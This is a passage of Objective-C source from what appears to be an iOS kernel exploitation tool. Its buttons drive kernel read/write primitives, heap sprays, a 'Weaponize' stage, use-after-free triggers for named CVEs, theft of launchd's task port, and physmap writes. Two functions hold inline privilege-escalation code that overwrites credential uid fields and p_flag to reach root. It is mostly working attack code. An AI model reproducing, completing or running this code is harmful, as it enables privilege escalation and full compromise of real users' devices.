    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = @"Дамп… (пишется инкрементально, паника не сотрёт готовое)";

    [KPRunner runDumpWithCompletion:^(BOOL success, NSString *reportPath) {
        if (success && reportPath) {
            self.reportPath = reportPath;
            self.statusLabel.text = @"Готово. Отчёт: Documents/kexproof-dump.txt";
            self.shareButton.enabled = YES;
            self.shareButton.alpha = 1.0;
        }
        else {
            self.statusLabel.text = @"Дамп прерван — частичный отчёт уже на диске, жми «Поделиться».";
            self.reportPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-dump.txt"];
        }
        self.jobRunning = NO;
        [self updateExperimentButtons];
    }];
}

- (void)sptmTapped {
    [self runDiagnosticWithStatus:@"A0: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump sptmWriteTestReport]};
    } completion:^(NSDictionary *result) {
        self.statusLabel.text = @"A0 завершён — см. лог";
        [self appendLogText:result[@"report"]];
    }];
}

- (void)sptmTableTapped {
    [self runDiagnosticWithStatus:@"A1: frame_table… (может ребутнуть!)" work:^NSDictionary *{
        return @{@"report": [KPDump sptmFrameTableWriteTestReport]};
    } completion:^(NSDictionary *result) {
        self.statusLabel.text = @"A1 завершён — см. лог";
        [self appendLogText:result[@"report"]];
    }];
}

- (void)surveyTapped {
    [self runDiagnosticWithStatus:@"E1–E3: обзор SPTM… (read-only)" work:^NSDictionary *{
        NSString *survey = [KPDump sptmSurveyReport];
        // Refresh the main dump too: it now embeds the fixed allproc (EXP-01)
        // and the harvested SPTM/TXM bases (EXP-02).
        NSString *dump = [KPDump buildReport];
        // R5e: scope recon for the retype path (read-only).
        NSString *scope = [KPMapScope kernelPmapScopeReport];
        return @{@"survey": survey, @"dump": dump, @"scope": scope};
    } completion:^(NSDictionary *result) {
            NSString *survey = result[@"survey"];
            NSString *dump = result[@"dump"];
            NSString *scope = result[@"scope"];
            self.statusLabel.text = @"E1–E3 завершены — см. лог";
            [self appendLogText:survey];
            if (scope.length) [self appendLogText:scope];
            [self saveExperimentReport:survey fileName:@"kexproof-e1e3-survey.txt"];
            if (scope.length) [self saveExperimentReport:scope fileName:@"kexproof-r5e-scope.txt"];
            NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
            NSError *error = nil;
            if (![dump writeToFile:[docs stringByAppendingPathComponent:@"kexproof-dump.txt"]
                   atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
                self.statusLabel.text = @"Не удалось сохранить дамп — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка сохранения дампа: %@", error];
            }
    }];
}

// R5e: standalone scope recon — read-only. Same gate as other diagnostics.
- (void)scopeTapped {
    [self runDiagnosticWithStatus:@"R5e: kernel_pmap scope… (read-only)" work:^NSDictionary *{
        return @{@"report": [KPMapScope kernelPmapScopeReport]};
    } completion:^(NSDictionary *result) {
        NSString *report = result[@"report"];
        self.statusLabel.text = @"R5e завершён — см. лог";
        [self appendLogText:report];
        [self saveExperimentReport:report fileName:@"kexproof-r5e-scope.txt"];
    }];
}

- (void)rootTapped {
    if (!KPRunner.hasKRW || self.jobRunning) return;
    UIAlertController *confirm = [UIAlertController
        alertControllerWithTitle:@"E9: ucred swap"
        message:@"Одна 8-байтная heap-запись: proc_ro->p_ucred → форг в pipe-буфере (uid/gid 0, label очищен). Форг не освобождается, оригинал логируется. Малый риск паники. Продолжить?"
        preferredStyle:UIAlertControllerStyleAlert];
    [confirm addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
    __weak typeof(self) weakSelf = self;
    [confirm addAction:[UIAlertAction actionWithTitle:@"Выполнить" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        [weakSelf runRootSwap];
    }]];
    [self presentViewController:confirm animated:YES completion:nil];
}




- (void)runGlyphSpray {
    if (![self beginJob]) return;
    self.statusLabel.text = @"R5j: спрей + glyph… (один выстрел на бут)";
    [[KPLog shared] append:@"[RESULT] R5j: Glyph+spray — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPMapScope glyphSprayReport];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            self.statusLabel.text = @"R5j завершён — см. лог";
            [self saveExperimentReport:report fileName:@"kexproof-r5j-glyphspray.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runGlyphSprayVariant:(NSString *)vname {
    // W-variant spray: matching size class (4156 / 8252), 2048 live + 2048 holes.
    if (![self beginJob]) return;
    self.statusLabel.text = [NSString stringWithFormat:@"W-spray %@… (один выстрел на бут)", vname];
    [[KPLog shared] appendFormat:@"[RESULT] W-spray %@ — запуск", vname];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPMapScope glyphSprayReportVariant:vname];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            self.statusLabel.text = [NSString stringWithFormat:@"W-spray %@ завершён — см. лог", vname];
            [self saveExperimentReport:report fileName:
                [NSString stringWithFormat:@"kexproof-wspray-%@.txt", vname]];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runTypedSpray:(NSString *)vname {
    if (![self beginJob]) return;
    self.statusLabel.text = [NSString stringWithFormat:@"Typed spray %@… (size@+8)", vname];
    [[KPLog shared] appendFormat:@"[RESULT] Typed spray %@ — запуск", vname];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPMapScope glyphTypedSprayReport:vname];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            self.statusLabel.text = [NSString stringWithFormat:@"Typed spray %@ завершён — см. лог", vname];
            [self saveExperimentReport:report fileName:
                [NSString stringWithFormat:@"kexproof-typed-%@.txt", vname]];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runWeaponize {
    if (![self beginJob]) return;
    self.statusLabel.text = @"Weaponize u32-len + OOB…";
    [[KPLog shared] append:@"[RESULT] Weaponize — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPMapScope glyphWeaponizeReport:@"calif"];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            self.statusLabel.text = @"Weaponize завершён — см. лог";
            [self saveExperimentReport:report fileName:@"kexproof-weaponize.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runRootViaUcredRw {
    if (![self beginJob]) return;
    self.statusLabel.text = @"ROOT via ucred_rw…";
    [[KPLog shared] append:@"[RESULT] ROOT via ucred_rw — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *r = [NSMutableString string];
        [r appendString:@"\n=== ROOT via ucred_rw (type 0x21 writable) ===\n"];
        extern uint64_t early_kread64(uint64_t where);
        extern void early_kwrite64(uint64_t where, uint64_t what);
        extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
        extern uint64_t kvtophys(uint64_t kv);
        extern uint64_t phystokv(uint64_t pa);
        extern uint32_t off_proc_p_proc_ro;
        extern uint32_t off_proc_ro_p_ucred;

        // 1. Find self proc
        uint64_t proc = kp_find_self_proc_by_pid(getpid());
        if (!proc) { [r appendString:@"  proc not found\n"]; goto done; }
        [r appendFormat:@"  proc = 0x%016llx\n", proc];

        // 2. Walk to ucred: proc -> p_proc_ro -> ucred
        uint64_t procRo = early_kread64(proc + off_proc_p_proc_ro);
        [r appendFormat:@"  p_proc_ro = 0x%016llx\n", procRo];
        uint64_t ucred = early_kread64(procRo + off_proc_ro_p_ucred);
        [r appendFormat:@"  ucred = 0x%016llx\n", ucred];

        // 3. Get ucred_rw (at ucred+0x00, type 0x21)
        uint64_t ucredRw = early_kread64(ucred + 0x00);
        [r appendFormat:@"  ucred_rw = 0x%016llx\n", ucredRw];
        uint64_t rwPA = kvtophys(ucredRw & ~0x3fffULL);
        [r appendFormat:@"  ucred_rw PA = 0x%016llx\n", rwPA];

        // 4. Inflate refcount at ucred_rw+0
        uint64_t ref0 = early_kread64(ucredRw);
        [r appendFormat:@"  refcount before = 0x%016llx\n", ref0];
        early_kwrite64(ucredRw, ref0 + 0x10000);
        uint64_t refAfter = early_kread64(ucredRw);
        [r appendFormat:@"  refcount after  = 0x%016llx  %s\n", refAfter,
            (refAfter == ref0 + 0x10000) ? "INFLATED OK" : "FAILED"];

        // 5. Find uid cluster — rw10 is a PAC-tagged pointer, strip PAC
        extern uint64_t xpaci(uint64_t ptr);
        uint64_t rw10raw = early_kread64(ucredRw + 0x10);
        uint64_t rw10 = xpaci(rw10raw);
        [r appendFormat:@"  rw10 raw=0x%016llx → xpaci=0x%016llx\n", rw10raw, rw10];
        // Dump ucred_rw fully to find writable uid copy
        [r appendFormat:@"  ucred_rw dump at 0x%016llx:\n", ucredRw];
        for (uint32_t o = 0; o < 0x100; o += 8) {
            uint64_t q = early_kread64(ucredRw + o);
            [r appendFormat:@"    +0x%02x: 0x%016llx", o, q];
            if ((uint32_t)q == 501) [r appendString:@"  ★ 501!"];
            if ((uint32_t)(q >> 32) == 501) [r appendString:@"  ★ 501 (high)!"];
            [r appendString:@"\n"];
        }
        int found501 = 0;
        // Scan the posix_cred object at rw10 for 501
        if (rw10 > 0xfffffff000000000ULL) {
            for (uint32_t o = 0; o < 0x80; o += 8) {
                uint64_t q = early_kread64(rw10 + o);
                if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
                    [r appendFormat:@"  ★ 501-cluster at posix_cred+0x%02x = 0x%016llx\n", o, q];
                    found501 = 1;
                    uint64_t saved = q;
                    uint64_t newVal = q & 0xffffffff00000000ULL;
                    early_kwrite64(rw10 + o, newVal);
                    uint64_t rb = early_kread64(rw10 + o);
                    [r appendFormat:@"  wrote uid=0: 0x%016llx -> 0x%016llx (readback 0x%016llx)\n", saved, newVal, rb];
                    uid_t u = getuid();
                    [r appendFormat:@"  getuid() = %d\n", u];
                    if (u == 0) {
                        [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
                    } else {
                        [r appendString:@"  getuid unchanged — restoring\n"];
                        early_kwrite64(rw10 + o, saved);
                    }
                    break;
                }
            }
        }
        // Also scan ucred_rw itself (not just +0x10)
        if (!found501) {
            [r appendString:@"  scanning ucred_rw directly...\n"];
            for (uint32_t o = 0; o < 0x100; o += 8) {
                uint64_t q = early_kread64(ucredRw + o);
                if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
                    [r appendFormat:@"  ★ 501 at ucred_rw+0x%02x = 0x%016llx\n", o, q];
                }
            }
        }

        // Restore refcount
        early_kwrite64(ucredRw, ref0);
        [r appendString:@"  refcount restored\n"];

    done:
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:r];
            self.statusLabel.text = [NSString stringWithFormat:@"ROOT test — uid=%d", (int)getuid()];
            [self saveExperimentReport:r fileName:@"kexproof-root-ucredrw.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runKrwWriteTest {
    if (![self beginJob]) return;
    self.statusLabel.text = @"KRW write test + root attempt…";
    [[KPLog shared] append:@"[RESULT] KRW write test + root — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *r = [NSMutableString string];
        [r appendString:@"\n=== KRW write test + root attempt ===\n"];
        extern uint64_t darksword_control_pcb(void);
        extern uint64_t early_kread64(uint64_t where);
        extern krw_zone_verdict kwrite_zone_element_qword(uint64_t dst, uint64_t value,
                                                          uint64_t objBase, uint64_t objSize);
        // Step 1: verify KRW write works
        uint64_t pcb = darksword_control_pcb();
        if (!pcb) {
            [r appendString:@"  control pcb not available — run pe_v1 first\n"];
        } else {
            [r appendFormat:@"  control pcb = 0x%016llx\n", pcb];
            uint64_t chksumAddr = pcb + 0x150;
            uint64_t orig = early_kread64(chksumAddr);
            uint64_t testVal = 0x1122334455667788ULL;
            kwrite_zone_element_qword(chksumAddr, testVal, pcb, 0x200);
            uint64_t rb = early_kread64(chksumAddr);
            [r appendFormat:@"  KRW test: wrote 0x%016llx  readback 0x%016llx  %s\n",
                testVal, rb, (rb == testVal) ? "VERIFIED" : "FAILED"];
            kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);

            // Step 2: find self proc via allproc walk
            extern uint64_t early_kread64(uint64_t where);
            uint64_t proc = 0;
            // Use KPDump's findSelfProcByPidFast via a helper
            extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
            proc = kp_find_self_proc_by_pid(getpid());
            [r appendFormat:@"  getuid() = %d\n", getuid()];
            if (proc) {
                [r appendFormat:@"  self proc = 0x%016llx\n", proc];
                // Read p_list.next to verify
                uint64_t listNext = early_kread64(proc);
                [r appendFormat:@"  p_list.next = 0x%016llx\n", listNext];
                // Write test to proc+0x00
                uint64_t procTest = 0xAAAABBBBCCCCDDDDULL;
                krw_zone_verdict pv = kwrite_zone_element_qword(proc, procTest, proc, 0x1000);
                uint64_t procRB = early_kread64(proc);
                [r appendFormat:@"  proc+0 write: verdict=%d  readback=0x%016llx\n", (int)pv, procRB];
                if (procRB == procTest) {
                    [r appendString:@"  >>> PROC WRITE VERIFIED! type 0x21 writable!\n"];
                    kwrite_zone_element_qword(proc, listNext, proc, 0x1000);
                    [r appendString:@"  restored p_list.next\n"];

                    // ---- try p_flag for root ----
                    extern uint32_t off_proc_p_flag;
                    uint64_t flagSlot = proc + off_proc_p_flag;
                    uint64_t origFlag = early_kread64(flagSlot);
                    [r appendFormat:@"  p_flag = 0x%016llx (slot=0x%016llx)\n", origFlag, flagSlot];
                    // Set P_SUGID (0x00000400) and other privileged flags
                    uint64_t newFlag = origFlag | 0x00000400 | 0x00000800 | 0x00000020;
                    krw_zone_verdict fv = kwrite_zone_element_qword(flagSlot, newFlag, proc, 0x1000);
                    uint64_t flagRB = early_kread64(flagSlot);
                    [r appendFormat:@"  p_flag write: verdict=%d  readback=0x%016llx\n", (int)fv, flagRB];
                    if (flagRB == newFlag) {
                        [r appendFormat:@"  >>> P_FLAG WRITTEN! getuid() now: %d\n", getuid()];
                        if (getuid() == 0) {
                            [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
                        }
                    }
                    // Restore flag
                    kwrite_zone_element_qword(flagSlot, origFlag, proc, 0x1000);
                    [r appendFormat:@"  getuid() after restore: %d\n", getuid()];
                } else {
                    [r appendString:@"  >>> proc write did not persist\n"];
                    kwrite_zone_element_qword(proc, listNext, proc, 0x1000);
                }
            } else {
                [r appendString:@"  self proc not found (run full exploit first)\n"];
            }
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:r];
            self.statusLabel.text = @"KRW + root test завершён — см. лог";
            [self saveExperimentReport:r fileName:@"kexproof-krw-root-test.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runGlyphGrift {
    // Glyph Grift needs NO KRW / no exploit — pure ImageIO. Run it any time,
    // even repeatedly in the same boot (the exploit cannot re-run per boot).
    if (![self beginJob]) return;
    self.statusLabel.text = @"R5h: Glyph Grift test… (паника = баг жив)";
    [[KPLog shared] append:@"[RESULT] R5h: Glyph Grift — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPMapScope glyphGriftProbeReport];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            self.statusLabel.text = @"R5h выжил — бага нет (или не достигнут)";
            [[KPLog shared] append:@"[RESULT] R5h: SURVIVED — sat/trunc mismatch не сработал"];
            [self saveExperimentReport:report fileName:@"kexproof-r5h-glyphgrift.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runNecpCalib {
    [self runDiagnosticWithStatus:@"R5g: NECP UAF calib…" work:^NSDictionary *{
        return @{@"report": [KPMapScope necpCalibReport]};
    } completion:^(NSDictionary *result) {
        NSString *report = result[@"report"];
        self.statusLabel.text = @"R5g завершён — см. лог";
        [self appendLogText:report];
        [self saveExperimentReport:report fileName:@"kexproof-r5g-necp-calib.txt"];
    }];
}

- (void)runRootSwap {
    [self runDiagnosticWithStatus:@"E9: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump ucredHeapSwapReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL root = (getuid() == 0);
            self.statusLabel.text = root ? @"E9 PASS: uid 0 (root) — см. лог" : @"E9 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-e9-ucred.txt"];
    }];
}

- (void)nestRaceTapped {
    [self runDiagnosticWithStatus:@"EXP-13: гонка nest/unnest… (может ребутнуть!)" work:^NSDictionary *{
        return @{@"report": [KPDump sptmNestRaceReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"EXP-13 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-exp13.txt"];
    }];
}

// E10: только по кнопке — KPRunner его не трогает. Гейт на hasKRW живёт
// внутри runDiagnosticWithStatus.
- (void)e10Tapped {
    [self runDiagnosticWithStatus:@"E10: кража task-port launchd…" work:^NSDictionary *{
        return @{@"report": [KPDump taskPortTheftReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"E10 PASS"];
            self.statusLabel.text = pass ? @"E10 PASS: task port launchd (pid 1) — см. лог"
                                         : @"E10 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-e10.txt"];
    }];
}

// E11: только по кнопке, тот же гейт hasKRW внутри runDiagnosticWithStatus.
- (void)e11Tapped {
    // 2.0.158: E11 swap is dead (field). Button = kcall test.
    [self runDiagnosticWithStatus:@"KCALL test: TH_IN_MACH_EXCEPTION…" work:^NSDictionary *{
        return @{@"report": [KPDump kcallTestReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"KCALL VALID"];
            self.statusLabel.text = pass ? @"KCALL VALID ★★" : @"KCALL test — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-kcall.txt"];
    }];
}

// M2Scaler probe: KRW не нужен (IOKit open/close из sandbox), поэтому
// безгейтовый вариант runDiagnosticWithStatus.
- (void)m2Tapped {
    [self runUnprivilegedDiagnosticWithStatus:@"M2Scaler: IOKit probe…" work:^NSDictionary *{
        return @{@"report": [KPDump m2ScalerReachabilityReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL reachable = [report containsString:@"M2SCALER REACHABLE"];
            self.statusLabel.text = reachable ? @"M2Scaler REACHABLE — CVE-2025-43510/43655 доступны!"
                                              : @"M2Scaler закрыт sandbox'ом — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2scaler.txt"];
    }];
}

// M2Scaler teardown UAF (CVE-2026-43655): ДЕСТРУКТИВНО — успех это паника,
// тогда completion не выполнится никогда (всё уже sync-записано в live-log).
// Если completion отработал — паники не было: баг не сработал в этом прогоне.
- (void)m2uafTapped {
    [self runUnprivilegedDiagnosticWithStatus:@"JPEG UAF: victim→reclaim→trigger… (МОЖЕТ ПАНИКОВАТЬ!)" work:^NSDictionary *{
        return @{@"report": [KPDump necpUafProbeReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL ran = ![report containsString:@"NECP SKIP"];
            self.statusLabel.text = ran ? @"NECP UAF: готово — см. лог"
                                        : @"NECP: прогон невозможен — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-necp.txt"];
    }];
}

// Physmap write user test: только по кнопке, гейт hasKRW живёт внутри
// runDiagnosticWithStatus.
- (void)physmapTapped {
    [self runDiagnosticWithStatus:@"Physmap write user: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump physmapWriteUserTestReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"PHYSMAP WRITE USER PASS"];
            self.statusLabel.text = pass ? @"PHYSMAP WRITE USER PASS — подмена данных процессов доступна"
                                         : @"Physmap write user завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-physmapwrite.txt"];
    }];
}

- (void)gartTapped {
    [self runDiagnosticWithStatus:@"GART recon: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump gartProbeReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"GART recon завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-gart.txt"];
    }];
}

- (void)geoTapped {
    [self runUnprivilegedDiagnosticWithStatus:@"Reachability-матрица: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump reachabilityReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"Reachability: готово — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-reachability.txt"];
    }];
}

- (void)m2tTapped {
    [self runDiagnosticWithStatus:@"M2 teardown UAF: калибровка → гонка (паника возможна)…" work:^NSDictionary *{
        return @{@"report": [KPDump m2TeardownUafReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"M2 teardown: прогон завершён без паники — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2teardown.txt"];
    }];
}

- (void)jpegTapped {
    [self runDiagnosticWithStatus:@"JPEG startDecoder UAF: victim→reclaim→trigger (паника = подтверждение)…" work:^NSDictionary *{
        return @{@"report": [KPDump jpegUafReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"JPEG UAF: прогон завершён без паники — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-jpeg.txt"];
    }];
}

- (void)m2oTapped {
    [self runDiagnosticWithStatus:@"M2 oracle: discovery scheduler'а → OOB-read свип…" work:^NSDictionary *{
        return @{@"report": [KPDump m2OracleReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"M2 oracle: готово — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2oracle.txt"];
    }];
}

- (void)dmaTapped {
    // 2.0.154: C3-WRITE — DART alt-PTE remap to sacrificial uid=0 page.
    // Field: may reboot. Read-only hunt is c3AltPteReport if this dies.
    [self runDiagnosticWithStatus:@"C3-WRITE: DART alt-PTE remap…" work:^NSDictionary *{
        return @{@"report": [KPDump c3AltPteWriteReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL win = [report containsString:@"P1"] && [report containsString:@"GETUID=0"];
            self.statusLabel.text = win ? @"C3-WRITE P1!" : @"C3-WRITE завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-c3write.txt"];
    }];
}

- (void)oolTapped {
    // OOL port-array UAF detection. Trigger is pure mach_msg; KRW snapshot
    // is best-effort (live srights calibration).
    [self runDiagnosticWithStatus:@"OOL-port-array UAF: duplicate-name MOVE_SEND…" work:^NSDictionary *{
        return @{@"report": [KPDump oolPortArrayProbeReport]};
    } completion:^(NSDictionary *result) {
        NSString *report = result[@"report"];
        BOOL win = [report containsString:@"UNDERFLOW=1"];
        self.statusLabel.text = win ? @"OOL: UNDERFLOW — см. лог" : @"OOL завершён — см. лог";
        [self appendLogText:report];
        [self saveExperimentReport:report fileName:@"kexproof-ool.txt"];
    }];
}

- (void)agxTcTapped {
    [self runDiagnosticWithStatus:@"AGX type-confusion: stamp-slot reuse…" work:^NSDictionary *{
        return @{@"report": [KPDump agxTypeConfProbeReport]};
    } completion:^(NSDictionary *result) {
        NSString *report = result[@"report"];
        BOOL win = [report containsString:@"CORRUPT=1"];
        self.statusLabel.text = win ? @"AGX: CORRUPT — см. лог" : @"AGX завершён — см. лог";
        [self appendLogText:report];
        [self saveExperimentReport:report fileName:@"kexproof-agx-tc.txt"];
    }];
}

- (void)shareTapped {
    // kexproofv2 2.0.2: ОДИН консолидированный файл на момент тапа. Живой
    // транскрипт + все дисковые логи (live + все prev-* + stage-файлы) —
    // ничего не обрезается и не теряется при ротации. Жалоба 2.0.x: «лог
    // обрезан, части от полного нет» — это был cap транскрипта 192KB и
    // reportPath от ПРЕДЫДУЩЕГО прогона.
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    df.dateFormat = @"yyyyMMdd-HHmmss";
    NSString *bundleName = [NSString stringWithFormat:@"kexproof-share-%@.txt", [df stringFromDate:[NSDate date]]];
    NSString *bundlePath = [docs stringByAppendingPathComponent:bundleName];

    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== KexProofV2 consolidated share @ %@ ===\n", [NSDate date]];
    [out appendFormat:@"[экранный транскрипт текущей сессии: %lu байт]\n", (unsigned long)[KPLog shared].transcript.length];
    [out appendString:@"\n----- TRANSCRIPT (in-memory, screen) -----\n"];
    [out appendString:[KPLog shared].transcript ?: @"(пуст)"];
    [out appendString:@"\n\n"];

    NSMutableArray<NSString *> *diskFiles = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    // все prev-ротации (самые свежие первыми) + live + stage-файлы + отчёт
    NSArray<NSString *> *all = [fm contentsOfDirectoryAtPath:docs error:nil] ?: @[];
    NSArray<NSString *> *sorted = [all sortedArrayUsingSelector:@selector(localizedCaseInsensitiveCompare:)];
    for (NSString *fn in [sorted reverseObjectEnumerator]) {
        if ([fn hasPrefix:@"kexproof-prev"] && [fn hasSuffix:@".log"]) [diskFiles addObject:fn];
    }
    [diskFiles addObject:@"kexproof-live.log"];
    for (NSString *fn in @[ @"kexproof-paswap.txt", @"kexproof-gart.txt", @"kexproof-pac.txt",
                            @"kexproof-m2teardown.txt", @"kexproof-jpeg.txt", @"kexproof-reachability.txt",
                            @"kexproof-m2oracle.txt", @"kexproof-dump.txt", @"kexproof-e9.txt" ]) {
        if (![diskFiles containsObject:fn]) [diskFiles addObject:fn];
    }
    if (self.reportPath.lastPathComponent.length) [diskFiles addObject:self.reportPath.lastPathComponent];

    for (NSString *fn in diskFiles) {
        NSString *fp = [docs stringByAppendingPathComponent:fn];
        NSDictionary *attrs = [fm attributesOfItemAtPath:fp error:nil];
        if (!attrs) continue;
        [out appendFormat:@"\n\n========== FILE: %@ (%llu байт, mtime=%@) ==========\n",
            fn, attrs.fileSize, attrs.fileModificationDate];
        NSString *body = [NSString stringWithContentsOfFile:fp encoding:NSUTF8StringEncoding error:nil];
        if (!body) body = [NSString stringWithContentsOfFile:fp encoding:NSISOLatin1StringEncoding error:nil];
        [out appendString:body ?: @"(не прочитался)"];
    }

    NSError *werr = nil;
    if (![out writeToFile:bundlePath atomically:YES encoding:NSUTF8StringEncoding error:&werr]) {
        self.statusLabel.text = @"Не удалось собрать бандл — см. журнал";
        [[KPLog shared] appendFormat:@"[share] ошибка записи бандла: %@", werr];
        return;
    }
    [[KPLog shared] appendFormat:@"[share] собран консолидированный бандл: %@ (%lu байт) — кидай на PC целиком",
        bundleName, (unsigned long)out.length];
    // логи спасены → флаг мёртвого прогона можно снять
    NSString *crashFlag = [docs stringByAppendingPathComponent:@"kexproof-crash.flag"];
    [[NSFileManager defaultManager] removeItemAtPath:crashFlag error:nil];

    NSArray *items = @[ [NSURL fileURLWithPath:bundlePath] ];
    UIActivityViewController *activity = [[UIActivityViewController alloc] initWithActivityItems:items applicationActivities:nil];
    activity.popoverPresentationController.sourceView = self.shareButton;
    [self presentViewController:activity animated:YES completion:nil];
}

@end
